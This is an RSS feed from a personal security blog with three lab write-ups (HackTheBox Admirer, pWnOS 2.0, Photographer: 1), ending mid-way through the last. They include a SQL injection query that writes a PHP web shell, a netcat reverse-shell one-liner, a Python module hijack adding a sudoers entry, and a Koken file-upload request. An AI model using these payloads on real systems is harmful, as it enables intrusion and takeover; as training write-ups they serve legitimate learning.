<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Barvent</title>
    <description>Barvent's technology blog
</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Fri, 30 Oct 2020 16:05:40 -0400</pubDate>
    <lastBuildDate>Fri, 30 Oct 2020 16:05:40 -0400</lastBuildDate>
    <generator>Jekyll v4.1.1</generator>
    
      <item>
        <title>HackTheBox: Admirer WriteUp</title>
        <description>&lt;p&gt;Admirer is an easy rated machine hosted in HackTheBox. As always, the goal is to obtain root and read the flag in /root/root.txt.&lt;br /&gt;
It’s been a long time since I’ve posted something, that is because I am really busy with college right now so I don’t have time to solve CTFs and do the write-ups.&lt;/p&gt;
&lt;h1&gt;Port Scan&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;portscan.png&quot; alt=&quot;Port Scan&quot; /&gt;
We can see that there are 3 ports open with ftp, ssh and http.&lt;/p&gt;
&lt;h1&gt;HTTP Enumeration&lt;/h1&gt;
&lt;p&gt;Looking at the default scripts output from Nmap we can see that there is a robots.txt file with a disallowed entry.
&lt;img src=&quot;robots.png&quot; alt=&quot;Robots&quot; /&gt;
The entry is a directory without directory listing enabled, so I used Gobuster to enumerate the files.
&lt;img src=&quot;gobusterAdminDir.png&quot; alt=&quot;Gobuster Admin Dir&quot; /&gt;
There are two files, one with some names and emails and the other one with some credentials.
&lt;img src=&quot;contacts.png&quot; alt=&quot;Contacts&quot; /&gt;
&lt;img src=&quot;credentials.png&quot; alt=&quot;Credentials&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;FTP Authenticated Login&lt;/h1&gt;
&lt;p&gt;FTP doesn’t have anonymous access enabled but the credentials obtained in the credentials.txt file allow us to login as ftpuser to the server. There are only two files inside the FTP server (a database dump and a tar.gz file).
&lt;img src=&quot;ftpFiles.png&quot; alt=&quot;FTP File List&quot; /&gt;
The database dump doesn’t have anything really interesting, but it tells us the database that is being used and some info about the server.
&lt;img src=&quot;sqldump.png&quot; alt=&quot;SQLDump&quot; /&gt;
The html.tar.gz seems to be an old backup of the web on port 80.
&lt;img src=&quot;htmlList.png&quot; alt=&quot;HTML list&quot; /&gt;
The w4ld0s_s3cr3t_d1r seems to be the same as admin-dir and the utility-scripts directory has some administration related php scripts.
&lt;img src=&quot;utilityScriptsLs.png&quot; alt=&quot;Utility Scripts ls&quot; /&gt;
Inside of the db_admin.php file we can read the following:
&lt;img src=&quot;db_adminCode.png&quot; alt=&quot;DB Admin Code&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;Finding Database Admin&lt;/h1&gt;
&lt;p&gt;The utilty-scripts directory exists on the web server but it doesn’t have the db_admin.php file, which means that they’ve found an open source alternative. I used both Gobuster and Google to find the necessary file.
&lt;img src=&quot;google.png&quot; alt=&quot;Google DBADMIN&quot; /&gt;
The first search result on Google shows “Adminer”, which is also the name of the database (it is written in the SQLDump).
Gobuster found a file called adminer.php inside of the utility-scripts directory.
&lt;img src=&quot;gobusterUtScr.png&quot; alt=&quot;Gobuster utility-scripts&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;Adminer Enumeration&lt;/h1&gt;
&lt;p&gt;The credentials of the database are inside the index.php file in the backup, but they don’t work with the Adminer page.
&lt;img src=&quot;indexBakCred.png&quot; alt=&quot;Backup credentials&quot; /&gt;
&lt;img src=&quot;loginFail.png&quot; alt=&quot;Login failed&quot; /&gt;
As we can see in the login failed image the installed version of Adminer is 4.6.2, which is &lt;a href=&quot;https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool&quot;&gt;vulnerable and leads to file disclosure&lt;/a&gt;.&lt;/p&gt;
&lt;h1&gt;Exploiting Adminer&lt;/h1&gt;
&lt;p&gt;To exploit the vulnerability we need to have a mysql server exposed to the network with users that have remote access and permissions to write in a table.&lt;br /&gt;
I changed the bind address inside the /etc/mysql/mariadb.conf.d/50-server.cnf file.
&lt;img src=&quot;adminerexp1.png&quot; alt=&quot;Bind Address&quot; /&gt;
&lt;img src=&quot;adminerexp2.png&quot; alt=&quot;Starting the server&quot; /&gt;
&lt;img src=&quot;adminerexp3.png&quot; alt=&quot;Create user and GRANT&quot; /&gt;
&lt;img src=&quot;adminerexp4.png&quot; alt=&quot;Create the table&quot; /&gt;
Once all the preparations are done we only need to connect to our server using the Adminer of the machine.
&lt;img src=&quot;adminerLogin1.png&quot; alt=&quot;Adminer Login&quot; /&gt;
&lt;img src=&quot;adminerLogin2.png&quot; alt=&quot;Adminer Login Success&quot; /&gt;
Then we can execute this query with the index.php file to dump the current database credentials into our SQL server:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;LOAD&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;DATA&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;INFILE&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;&quot;nameOfFile&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;query1.png&quot; alt=&quot;Query Executed&quot; /&gt;
&lt;img src=&quot;query2.png&quot; alt=&quot;Credentials&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;SSH as Waldo&lt;/h1&gt;
&lt;p&gt;The credentials found using the file disclosure can be used to access the machine as the waldo user.
&lt;img src=&quot;sshWaldo.png&quot; alt=&quot;SSH&quot; /&gt;
Running the “sudo -l” command we can see that waldo can execute the “/opt/scripts/admin_tasks.sh” as root while preserving his environment variables.
&lt;img src=&quot;sudo-l.png&quot; alt=&quot;Sudo -l&quot; /&gt;
This code calls a python script that backups the web files:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;backup_web&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$EUID&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-eq&lt;/span&gt; 0 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;then
        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Running backup script in the background, it might take a while...&quot;&lt;/span&gt;
        /opt/scripts/backup.py &amp;amp;
    &lt;span class=&quot;k&quot;&gt;else
        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Insufficient privileges to perform the selected operation.&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The python script imports a function from the shutil module and executes it with three arguments:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;shutil&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;make_archive&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/var/www/html/'&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# old ftp directory, not used anymore
#dst = '/srv/ftp/html'
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/var/backups/html'&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;make_archive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'gztar'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h1&gt;PrivEsc to Root&lt;/h1&gt;
&lt;p&gt;Reading the python documentation I found that python has a variable that specifies the search path for the modules, which is initialized using the PYTHONPATH environment variable. If we change the PYTHONPATH we can inject a malicious module and run it as root.
&lt;img src=&quot;PYTHONPATHinfo.png&quot; alt=&quot;PYTHONPATH info&quot; /&gt;
I wrote this module, which grants waldo sudo privileges to run commands as every user (I tried using a reverse shell, but it didn’t work because the process was getting sent to background).&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;make_archive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arg1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arg2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arg3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/etc/sudoers&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;waldo    ALL=(ALL:ALL) ALL&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;privesc.png&quot; alt=&quot;PrivESC&quot; /&gt;&lt;/p&gt;

&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This machine focuses on enumerating the web server, which was an unknown topic for me the first time I attempted it. If you are familiar with this then the machine is pretty straightforward until the privilege escalation part, where I had to spend some time because I didn’t know anything about the python module importing mechanism.&lt;/p&gt;
</description>
        <pubDate>Fri, 30 Oct 2020 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/write-ups/htb_admirer_writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/write-ups/htb_admirer_writeup/</guid>
        
        
        <category>write-ups</category>
        
      </item>
    
      <item>
        <title>pWnOS v2.0 Write-Up</title>
        <description>&lt;p&gt;pWnOS is another OSCP-like machine from Vulnhub which has multiple ways to be solved.&lt;/p&gt;
&lt;h1&gt;Port Scan&lt;/h1&gt;
&lt;p&gt;This machine uses an static IP address (10.10.10.100), so we can skip the network scan.
&lt;img src=&quot;portScan.png&quot; alt=&quot;Port Scan&quot; /&gt;
There are only two ports open, one for SSH and the other one for HTTP (which is the most interesting).
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Port 80 Enumeration&lt;/h1&gt;
&lt;p&gt;The root page is an internal website with both a register and a login form. I registered into the website while Gobuster and SQLMap were running but I couldn’t get anything interesting from this. Gobuster found a directory called blog and SQLMap found that the login form was injectable.
&lt;img src=&quot;rootPage.png&quot; alt=&quot;Root page&quot; /&gt;
&lt;img src=&quot;gobuster.png&quot; alt=&quot;Gobuster output&quot; /&gt;
&lt;img src=&quot;sqlInjection.png&quot; alt=&quot;SQLInjection&quot; /&gt;
From here there are two methods that can be followed to get a shell into the machine.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Method 1 (SQL Injection)&lt;/h1&gt;
&lt;p&gt;Using the SQL Injection we can leak the hash of the password of the administrator, but it isn’t used for anything. I decided to do the SQL Injection methods manually after using SQLMap to try to learn more about them. First, I attempted to leak information using an “UNION SELECT” in the query with 8 columns. The fourth column was displayed in the login page, so I could change it to any column in any table to leak it.
&lt;img src=&quot;sqlLeak.png&quot; alt=&quot;Leaking info&quot; /&gt;
I added a “INTO OUTFILE ‘/var/www/shell.php’” to the previous query to try to upload a shell to the machine. The query ended up being:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; 
&lt;span class=&quot;k&quot;&gt;UNION&lt;/span&gt; 
&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; 
&lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;USERS&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OUTFILE&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;‘&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;’&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;#&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;sqlUpload.png&quot; alt=&quot;Uploading shell&quot; /&gt;
&lt;img src=&quot;sqlShell.png&quot; alt=&quot;SQL Shell&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;Method 2 (Exploiting Simple PHP Blog)&lt;/h1&gt;
&lt;p&gt;In the blog directory there is a blog that uses “Simple PHP Blog” version 0.4.0 (as seen in the page meta data). This version of Simple PHP has multiple vulnerabilities and I used a perl script from ExploitDB to exploit them.
&lt;img src=&quot;blogSource.png&quot; alt=&quot;Blog source&quot; /&gt;
&lt;img src=&quot;exploitDB.png&quot; alt=&quot;Exploits&quot; /&gt;
&lt;img src=&quot;exploitScriptOut.png&quot; alt=&quot;Exploit Script&quot; /&gt;
&lt;img src=&quot;webshell.png&quot; alt=&quot;Webshell&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;www-data Shell and PrivEsc&lt;/h1&gt;
&lt;p&gt;We can use a reverse shell from any of the two webshells that we uploaded to get a more interactive shell. To do so I used this one liner from the Pentest Monkey Cheatsheet:&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkfifo&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/f|/bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1|nc 10.10.10.10 1234 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/tmp/f &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;reverseShell.png&quot; alt=&quot;Reverse shell&quot; /&gt;
The first thing I did was checking the configuration files to get the user and the password of the MySQL account. I found two files with credentials, one at /var/mysqli_connect.php and the other one at /var/www/mysqli_connect.php. 
&lt;img src=&quot;credentials1.png&quot; alt=&quot;Credentials 1&quot; /&gt;
&lt;img src=&quot;credentials2.png&quot; alt=&quot;Credentials 2&quot; /&gt;
The second credentials were wrong, but the ones in the first one could also be used to get root in the machine.
&lt;img src=&quot;root.png&quot; alt=&quot;Root&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;Investigating other methods&lt;/h1&gt;
&lt;p&gt;The kernel version of the server is 2.6.38, which is really old. I tried using some kernel exploits but I couldn’t get them to work (probably because Dirty COW relies on a race condition but the machine only had one CPU).
&lt;img src=&quot;kernel.png&quot; alt=&quot;Kernel Version&quot; /&gt;
The other thing that caught my attention was the fact that the mysql user had UID of 0 and that the MySQL server was running as root, which means that we can write files on the machine with root privileges.
&lt;img src=&quot;mysqld-root.png&quot; alt=&quot;MySQLd root&quot; /&gt;
&lt;img src=&quot;writing-files.png&quot; alt=&quot;Writing files&quot; /&gt;
I spent a lot of time with this, but I couldn’t get anything. I tried writing an authorized_keys files but I wasn’t able to create a .ssh folder anywhere. I also tried to get code execution using the /etc/cron.d directory, but for reasons I don’t understand the cronfiles didn’t want to run (I did the same on my machine and it worked).
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Conclusions&lt;/h1&gt;
&lt;p&gt;This is a really easy machine which can be completed pretty fast, so I used it to learn more about SQL Injection and Linux privilege escalation.&lt;/p&gt;
</description>
        <pubDate>Mon, 24 Aug 2020 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/write-ups/pwnos-2-writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/write-ups/pwnos-2-writeup/</guid>
        
        
        <category>write-ups</category>
        
      </item>
    
      <item>
        <title>Photographer: 1 Write-Up</title>
        <description>&lt;p&gt;Photographer: 1 is a relatively new machine in Vulnhub, which was developed to help on the preparation for OSCP. The goal is to get the two flags inside of the machine (user.txt and proof.txt).&lt;/p&gt;
&lt;h1&gt;Network Scan&lt;/h1&gt;
&lt;p&gt;As always, I’ve used Nmap to sweep the network to find the IP of the target machine.
&lt;img src=&quot;network.png&quot; alt=&quot;Network Scan&quot; /&gt;
10.10.10.10 is the IP of my machine, so 10.10.10.128 is the target machine.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Port Scan&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;port.png&quot; alt=&quot;Port scan&quot; /&gt;
This machine has two HTTP ports and two SMB ports. I usually start with the HTTP ones because I find myself more comfortable working with them, but this time I decided to start with SMB.&lt;/p&gt;
&lt;h1&gt;SMB Enumeration&lt;/h1&gt;
&lt;p&gt;First, I enumerated the shares using smbclient.
&lt;img src=&quot;shares.png&quot; alt=&quot;SMB Shares&quot; /&gt;
The only interesting share is “sambashare”, so I tried to read it without password. 
&lt;img src=&quot;sambaShareList.png&quot; alt=&quot;SMB list&quot; /&gt;
It worked, so I downloaded the two files to my machine to inspect them more easily. The wordpress.bkp.zip has a fresh installation of Wordpress 5.4.2 (as seen in the wp-includes/version.php file) while the mailsent.txt is an email to a user called Daisa.
&lt;img src=&quot;wordpress.png&quot; alt=&quot;Wordpress Version&quot; /&gt;
&lt;img src=&quot;mailsent.png&quot; alt=&quot;Mail&quot; /&gt;
I also used enum4linux to get a bit more information, which got me two users on the machine.
&lt;img src=&quot;enum4linux.png&quot; alt=&quot;Enum4linux&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;Port 80 Enumeration&lt;/h1&gt;
&lt;p&gt;At a first glance port 80 doesn’t have anything interesting, but after rooting the machine I found that the koken directory could be accessed from there (if you can find it fuzzing the directories). This isn’t necessary as port 8000 directs you to the koken directory.&lt;/p&gt;
&lt;h1&gt;Port 8000 Enumeration&lt;/h1&gt;
&lt;p&gt;I found both on the NSE Scripts output and the page source the “Koken 0.22.24” string, which refers to the CMS used to build the page. There is &lt;a href=&quot;https://www.exploit-db.com/exploits/48706&quot;&gt;an entry on ExploitDB with an authenticated Arbitrary File Upload&lt;/a&gt; for this version (later I found that the author of the entry is the creator of the machine).&lt;br /&gt;
On the timeline page of the blog there is a shell.php file which attempts to connect to a machine, so it is confirmed that the exploit works on the installed version.
&lt;img src=&quot;shellTime.png&quot; alt=&quot;Shell.php Timeline&quot; /&gt;
&lt;img src=&quot;shellTime2.png&quot; alt=&quot;Shell.php Timeline 2&quot; /&gt;
There is a login form on the admin directory but I didn’t found any credential for it yet. After searching for default credentials on the internet or hidden files I decided to go back to my notes and read again the email found on the SMB share.&lt;br /&gt;
I guessed that the email used on the blog was “daisa@photographer.com” as the blog is “Daisa Website’s”. For the password I used “babygirl” because it really caught my attention.
&lt;img src=&quot;loginForm.png&quot; alt=&quot;Login form&quot; /&gt;
The credentials “daisa@photographer.com” and “babygirl” worked, so I followed the &lt;a href=&quot;https://www.exploit-db.com/exploits/48706&quot;&gt;exploit&lt;/a&gt; to upload my shell. I won’t explain the process as the ExploitDB explanation is good enough, but I’ll leave the HTTP Request that I used which should be enough to upload the shell.
&lt;img src=&quot;uploadShell1.png&quot; alt=&quot;Upload Shell 1&quot; /&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/api.php?/content&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;10.10.10.128:8000&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;*/*&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Accept-Language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;en-US,en;q=0.5&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gzip, deflate&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Referer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;http://10.10.10.128:8000/admin/&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;x-koken-auth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cookie&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;multipart/form-data; boundary=---------------------------888515285638187952681108602&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1077&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;koken_referrer=; koken_session_ci=azOCz7y1EQ2C8yqnmyADuudfsvdiw%2FsIERGMOrBHoMsQCLat9AQJq4hvGRG6arJqXcbdLAhIsMsFnFMzODgYRPEX5oaDfc0m9lRI3i4yDMq72RARdKf3etn6FzFBA4pJjQwVE2iBvvGNcKsVdf8eyB1GRmT1fActCB%2FcvgePW1t0cnIzBJx5rG1SGaDl1bFMCT1mmUP%2FZ5N%2Bl6ZSqTlyiWVs4ApVix06L6EMbw97WlAbyOFNl4jZwZKTjC%2FQo3KS514nXCz2iaf26Kc6blUq3bCRT3KUMdxZ%2FznD%2ByrwKApQsbWHKp6p%2BNavZ0tVWUpPZYNhTCrk1xuTnyIl92FqHcuu%2BS2id6XvjODFeSva1bsX1i1SjeJ9ec25xQdVcwKQ2oKCF9NahZvoy8ofCJ5c3c4tM%2B%2BM5jB55vK2q%2B%2FOBdAq0kCVameuSsIgRymlbbKbtnl6lNm%2BO8rsVTxrvFYfy8OeCgtVESGZqjz3JwrLWMVavxeWFKcCk1ZLpIqRmUer%2FIqkOm8sGb7l9GnnxfbFHP4dKKLi39S6UNPqYESpYpK9BfOyYI%2FaQusRG5RmltKso5%2B2l38l07NrbnsZ0qahDV4pdQJzLUhJXjJIAAONMDjKGLxcv%2F5l5ZZulM7lE0dlnVGfGjhxEhXof7AZ0GB3zJhGJDN3N9SLpQd7JYe9ZLM24GpY3at4RWCnnCgp%2FcbfWdCz%2FEshN9yspvMiNPv%2FFeF6BrtcXndy46ErPEY9St6ay1LzikQ4l2mZdn2E6GZyuttH%2FOVJEI12u70aRWSTQLuAs5TTtAbyn58Q7OJJIBPpX6vSEMAq1vJB1FlQ3CSCTE8mrAfp%2FNhQx4t7QrtNbBJJCV%2Bk7cYb8AUiBBuuk1h8Vi51wfPCWCstJHqSZXQgDs2DWJ3sbYEEGXZ38AgjbjYI7i3PcDl9dOb2PqHCEwfuGKHrgFpXGxsZkjO8vbNYM3dOvju5IXDtDp%2BVDCxFp7bQ0SxIq00T2qhDNRnjH1HdF7xInwD%2FMXT%2BnT4srGRB5xQI%2BMoy4GlHPwGSZf4LTq1y0Wq4TdTUryVC8CaBMle4iowOZ5fzY1zimG5dNkJrtWSW1ilBV8KLXRIeMwjgSzwqcR3%2BXsyP08wG%2FEixfvRqAFsze4s6M%2FHrUc%2BA2o4UjP82nNFfnMxBoMRoiuoE2m46kZnzlS1jSKp%2FS4Xs747%2FEz7dFFdqTvQFLtFkG0mZQcln55%2FXlM4ztPem2FbGioIkvUk0IB%2Bh10LK4abxQ6avAYP1V3ipaiWEgz%2BBty3t3615e0bf1ba28084be86fbe55846d5c1b6d9fb21&lt;/span&gt;

-----------------------------888515285638187952681108602
